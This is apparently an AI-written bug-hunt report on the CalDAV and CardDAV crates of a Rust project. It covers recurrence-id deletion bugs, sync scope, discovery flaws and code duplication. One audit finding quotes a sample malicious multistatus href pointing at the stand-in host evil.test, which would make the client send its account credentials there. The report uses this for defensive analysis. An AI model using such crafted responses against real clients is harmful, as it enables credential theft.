# bifrost-caldav / bifrost-carddav bug hunt

Hunter: Claude Opus, single pass, 2026-08-05. Scope: `crates/caldav/` and `crates/carddav/`,
hunted together because they share a DAV surface. Read-only review; no tests were run. Findings are
unverified work material.

The hunter confirmed the `status_line` unification (commit 77df77d) landed cleanly on both sides:
both `parse.rs` files import from `bifrost_net` and no local copy survives.

## Recurrence-override EventIds are unusable as resource ids; event_delete on one instance destroys the whole series

`crates/caldav/src/ical.rs`, `events_from_ical`: an override VEVENT gets
`EventId(format!("{uri}#{recurrence_id}"))`. `crates/caldav/src/account.rs` then feeds that id
straight into `client.resolve_url(&event.0)` for `event_get`, `event_update`, `event_delete`, and
`event_rsvp`. `resolve_url` returns an absolute href verbatim, so the string with the `#` fragment
goes to `reqwest`, which does not put the fragment on the wire. Every one of those calls therefore
hits the master resource:

- `event_get(override_id)` returns the master (via `event_from_ical`, which takes the first VEVENT),
  not the instance the consumer asked for.
- `event_update(override_id, patch)` splices the master VEVENT
  (`replace_first_vevent_properties`) and PUTs it back: the user edits an instance, the series
  changes.
- `event_delete(override_id)` DELETEs the whole `.ics`: one instance deleted, entire recurring
  series gone.

There is no `#` guard anywhere in the crate. The reference documents the qualified id as collision
avoidance for consumer indexes but never says the id is read-only, and nothing enforces it. This is
the worst thing in this scope. Fix options: reject fragment-bearing ids in the mutation paths with a
classified error, or make them real (resolve to the resource, locate the VEVENT by RECURRENCE-ID,
and splice/remove that component; a `THISANDFUTURE`-free instance edit is tractable, an instance
delete means emitting `EXDATE` on the master).

## A malicious or misconfigured DAV server can steer authenticated requests to any host

`resolve_href` (both `parse.rs`) and `resolve_url` (both `client.rs`) return an href verbatim when
it starts with `http://`/`https://`. Multistatus hrefs come from the server; they become native ids;
native ids come back as URLs for `get_event`/`put_event`/`delete_event`/`fetch_vcards`, each of
which attaches `Authorization` (Basic credentials or the bearer token) via `auth_headers`. So a 207
containing `<D:href>https://evil.test/x.ics</D:href>` exfiltrates the account credential on the next
hydration or write. The hardened `dav_redirect_policy` guards redirects only; it never sees the
initial request URL. The same holds for `CalendarId`/`AddressBookId`/`ContactId` values handed in by
a consumer. Both crates already compute the trusted host for the redirect policy; the same allowlist
should gate href rebasing (reject or path-relativize a cross-origin href at the decode boundary).

## Cursor sync only ever covers one collection

`CalDavAccount::establish_initial_cursor` / `inventory_stream` / `changes_stream` all use
`self.default_calendar_url` (the first collection returned by discovery); `CardDavAccount` does the
same with `default_addressbook_url`. `discover_cursor_scopes` returns a single
`CursorScope::Type(ObjectType::CalendarEvent)` / `Type(Contact)`. So an account with three calendars
enumerates all three in `calendars_list` but syncs only the first: events in the other two never
appear in inventory or changes, and never get an update or a delete. Neither reference names this as
a limitation; `reference/caldav.md` describes the cursor as if it were the account's whole event
surface. Either the scope needs to be per-collection (`CursorScope` per calendar href, which is the
honest model), or the limitation needs to be stated loudly.

## CardDAV discovery has a dead fallback leg

`CardDavClient::discover_addressbook_home`: if the `.well-known/carddav` PROPFIND succeeds but the
body carries no `current-user-principal`, `dav_root` is set to `well_known_url` and the function
issues the same PROPFIND to the same URL with the same body, guaranteed to produce the same `None`,
then errors "missing current-user-principal". It never falls back to `base_url`, which is presumably
the intent (that is what the error arm does). Costs one wasted round trip and makes discovery fail
against any server that answers `.well-known` with a 200 that is not a DAV principal response (a
login page, an SPA index).

Also: CalDAV discovers base-first-then-well-known, CardDAV discovers well-known-first-then-base. Two
crates, two orders, no stated reason.

## A partly-parseable time range silently turns into a full-collection download

`caldav_query_time` returns `None` on an unparseable `EventTime`, and `calendar_query_body` emits a
`time-range` element only when both start and end are `Some`. So one bad bound (or a one-sided
range) produces a `calendar-query` with no time filter at all: the server returns every VEVENT in
the collection, all of it hydrated with `calendar-data`, and the local `event_in_range` guard then
throws most of it away. On a large calendar this is a multi-megabyte accidental full sync per call.
CalDAV's `time-range` allows `start`-only and `end`-only forms; use them, and make a genuinely
unparseable bound an error rather than "fetch everything".

## CardDAV fabricates a phantom address book that CalDAV deliberately stopped fabricating

`CardDavAccount::address_books_list` pushes a synthetic `AddressBook` pointing at the home when the
home enumerates zero addressbook collections. `reference/caldav.md` spends a paragraph explaining
why the CalDAV equivalent was removed: a consumer cannot distinguish a genuinely empty backend (and
so cannot reap stale collections), and the phantom's queries 404 against a spec-correct server.
CardDAV has exactly the phantom CalDAV calls a bug. `reference/carddav.md` does not mention it either
way.

Related, in both crates: when discovery finds zero collections, `default_*_url` falls back to
`client.resolve_url(&home)`, so the cursor, inventory, and changes lanes all target the home
collection, which is the same phantom by another name.

## CardDAV re-lists the whole address book home on every poll

`CardDavAccount::contact_snapshot` always calls `list_addressbooks_for_operation(home, ...)`
(depth-1 PROPFIND over the home) purely to recover the ctag of one collection, then does the depth-1
contact listing. CalDAV fixed exactly this: `event_snapshot` takes `home: Option<&str>` and the poll
path passes `None` to use the cheap depth-0 `collection_sync_token`. CardDAV already has the depth-0
helper (`collection_ctag`) and even calls it in the short-circuit, then throws the answer away and
refetches it the expensive way. A changed-ctag poll costs three requests where two suffice; an
unchanged one is fine. `reference/caldav.md` states the depth-0 refinement; `reference/carddav.md`
implies parity it does not have.

## CalDAV silently ignores a calendar move; CardDAV rejects one

`CalDavAccount::event_update` uses `patch.calendar_id` only to compute the calendar URL for the
fetch, then PUTs to `client.resolve_url(&event.0)`, the original location. A caller asking to move
an event between calendars gets `Ok(())` and no move. `CardDavAccount::contact_update` handles the
same case explicitly with a `local_error` ("cannot move contacts between address books"). CalDAV
should do the same, or implement `MOVE`.

## event_get stamps the wrong calendar on the event

`fetch_event_from_url` with `calendar: None` (which is what `event_get` always passes) builds
`CalendarId(default_calendar_url)` and puts it on the returned `CalendarEvent` and in
`provenance.calendar_native`. Fetch an event that lives in a non-default calendar and it comes back
claiming to belong to the default one. CardDAV solves this: `fetch_contact_from_url` derives the
collection from the resource URL via `contact_addressbook_url`. CalDAV has no equivalent.

## RSVP is a non-atomic two-phase write with no compensation

`event_rsvp` POSTs the iTIP `METHOD:REPLY` to the schedule outbox first, then PUTs the
locally-rewritten resource. If the PUT fails (412 from `If-Match`, 503, token expiry), the organizer
has already been told the user accepted while the user's own copy still says otherwise, and the
returned error gives the consumer no way to know the reply went out. At minimum the error from the
second leg should carry that the reply was already transmitted; the `TransmissionState` machinery in
the error model exists for exactly this distinction and is not used here.

## Discovery failures permanently disable RSVP for the account's lifetime

`CalDavAccount::open` calls `discover_calendar_user_email().await.ok().flatten()` and
`discover_schedule_outbox_url().await.ok().flatten()`. A transient 503 or an expired token during
open makes `scheduling_available` false, `caldav_capabilities(false)` bakes
`pim_methods.event_rsvp = false` into an immutable field, and nothing re-probes: the account reports
"this server does not do scheduling" until reopened. A hard failure or a retry would both be better
than silently degrading a capability on a network blip.

Also in `open`: `discover_calendar_user_email`, `discover_schedule_outbox_url`, and
`discover_calendar_home` each independently call `discover_principal` (which itself may retry
against `.well-known`). That is three to six PROPFINDs on open where one principal lookup plus one
multi-prop PROPFIND would do; the three properties can be requested in a single `<D:prop>`.

## Resource identification is extension-based, and drops resources it does not recognize

`is_calendar_resource` accepts `text/calendar` or an `.ics` suffix, but `as_failed_event_href` and
`as_sync_entry` require the `.ics` suffix unconditionally (the sync-collection report carries no
content type at all). A server that names event resources without an extension, which is legal and
some do, yields an empty listing, which then trips `diff_event_snapshots`'s empty-multistatus guard
and wedges the cursor in a permanent "no observation" state that never resolves and never reports an
error. Same shape in CardDAV with `.vcf`. Worse: `sync-collection` deletion entries for such
resources are dropped silently, so deletes are lost even when the listing works.

Relatedly, `PROPFIND_CONTACTS` (CardDAV) does not request `resourcetype`, so
`parse_propfind_contacts` cannot detect collections at all and `as_contact_entry` has no
`is_collection` guard, unlike CalDAV's `as_event_entry`. The doc comment on
`as_failed_contact_href` claims "a failed collection is not a transiently-failed resource" as if it
were checking, when the only thing standing between a sub-collection and the failed-href lane is the
`.vcf` suffix.

## extract_href_properties ignores propstat status

Every other parser in both crates stages properties per-propstat and commits only on 2xx; that
invariant is the headline of both reference docs. `extract_href_property` /
`extract_href_properties` (used for `current-user-principal`, `calendar-home-set`,
`addressbook-home-set`, `schedule-outbox-URL`, `calendar-user-address-set`) walk the document flat
and return any href found inside an element with the right local name, regardless of the enclosing
propstat's status. A 404 propstat for `calendar-home-set` that echoes an href would be adopted as
the home. Low probability, but it is a hole in an invariant the docs state without qualification.

## The structural finding: these are one crate wearing two hats

Beyond `dav-F5`'s tracked transport seam, the duplication is far larger than the TODO records, and
it is not just `client.rs`:

- `client.rs`: `DavTransport` + `DavResponse` + `ReqwestDavTransport`, `dav_redirect_policy`,
  `auth_headers`, `escape_xml` (**already diverged**: CalDAV escapes `"`/`'`, CardDAV does not),
  `normalize_http_etag`, `prepare_if_match`, `propfind_raw`, `report_raw`,
  `send_body_request`/`send_status_request`/`send_raw_request`, `MultigetFetch`, `worse_recovery`,
  `recovery_rank`, `multiget_failure`, and the ~120-line `status_error` if-ladder (identical but for
  `ResourceKind::Calendar` vs `Contact` and `Protocol::CalDav` vs `CardDav`), plus
  `local_error`/`parse_error`/`transport_error`/`unsupported_error`.
- `parse.rs`: the whole `ResponseParts` propstat state machine, `commit_propstat`, `resolve_href`,
  `local_name`, `push_text`, `trimmed`, `normalize_etag`, `MultigetOutcome` + `classify`,
  `as_failed_multiget_resource`, `as_missing_multiget_data`.
- `account.rs`, not tracked at all: the cursor codec
  (`write_string`/`write_option_string`/`write_u32`/`read_string`/`read_option_string`/`read_u32`/`cursor_error`,
  and the magic+version envelope), `diff_*_snapshots` + `push_destroyed_unless_failed` +
  `object_change` + `inventory_entry_from_snapshot` (structurally identical), `put_condition`,
  `append_path`, `same_url`/`same_collection_url`, `one_outcome_per_id`,
  `unsupported_future`/`unsupported_stream`, `contains`, and the ~400 lines of `Unsupported` trait
  stubs each crate carries for the other's domain.

That is on the order of 1500 duplicated lines. The dav-F5 commit message is right about the
mechanism and understates the scope: a comment was holding two copies in step, and it was not
holding. Two copies have already drifted (`escape_xml`; the discovery order; the phantom collection;
the depth-0 poll) and the drift is invisible because nothing compares them.

The hunter's recommendation is stronger than "extract helpers": collapse to a single `bifrost-dav`
crate parameterized over the collection/resource kind, with CalDAV and CardDAV as thin projection
layers (`ical.rs` / `vcard.rs`) plus their prop constants and query bodies. The 207 parser, the
propstat state machine, the snapshot/diff/cursor machinery, the multiget chunking with `degraded`,
and `status_error` are all genuinely protocol-neutral WebDAV; the only CalDAV/CardDAV-specific parts
are the property names, the query XML, and the body projection. Pre-1.0 with both crates
crate-private below a factory, the blast radius is small and the payoff is that the phantom
collection, the depth-0 poll, and the resource-identification fixes land once.

Two dependent structural notes:

- The `DavTransport` seam exists solely because `bifrost-net`'s dispatcher is crate-private. The cost
  is that all DAV traffic bypasses bifrost-net entirely: no retry, no rate limiting, no bandwidth
  metering, no observability. `set_priority` and `set_bandwidth_cap` are no-ops in both crates, so an
  IMAP account composed `with_caldav`/`with_carddav` and a `BandwidthMeter` silently does not meter
  or cap its DAV legs. `reference/carddav.md` admits this in one line; `reference/caldav.md` does not
  mention it. If the unification happens, this is the moment to move onto `AccountNet` rather than
  keeping two hand-rolled `reqwest::Client`s with a 30s blanket timeout.
- The IMAP composition seam itself is fine (`classify_dav_open` degrades correctly into
  `skipped_scopes`), but `open_carddav` and `open_caldav` run sequentially, each paying the
  multi-round-trip discovery above. Joining them is free.

## Smaller things

- `MULTIGET_BATCH_SIZE = 50` and `CONTACT_PAGE_SIZE` chunking are fine, but `event_search`'s
  empty-query branch lists and hydrates every resource in the collection before applying
  `request.limit`; `events_in_range` likewise truncates to `limit` only after full hydration and
  projection. CardDAV's `contact_search` reruns the entire remote search and rehydrates everything
  for every page (documented as intentional in the reference, and it does make `failed_ids` per-page
  honest, but it is O(collection) per page).
- `event_in_range` uses closed-interval overlap (`event_start <= range_end && event_end >= range_start`)
  where CalDAV `time-range` is half-open. As a defensive guard it only over-includes, so it is not a
  correctness bug, but all-day events (whose DTEND is exclusive per the crate's own contract) will
  match a window starting exactly at their end.
- `recovery_rank` in both crates has a `_ => 2` catch-all over a `#[non_exhaustive]` enum: a new
  `RecoveryClass` more severe than `AuthLost` would silently rank below it.
- `changes_from_cursor` (CalDAV) keeps the previous sync token when `report.sync_token` is `None`.
  RFC 6578 requires the server to return one; a server that omits it makes every subsequent poll
  replay the same window. Harmless because the diff absorbs it, but it hides a server bug forever
  rather than surfacing it.
- CalDAV `report_raw` and CardDAV `report_raw` both send `Depth: 1` for every REPORT including
  `calendar-multiget`/`addressbook-multiget`, where the hrefs are enumerated in the body and RFC 4791
  section 7.9 / RFC 6352 section 8.7 use `Depth: 0`. Most servers ignore it; low confidence that any
  rejects it.
- `as_fetched_event` (CalDAV) has no `is_collection` guard, unlike `as_failed_multiget_resource` and
  `as_missing_multiget_data` in the same file.
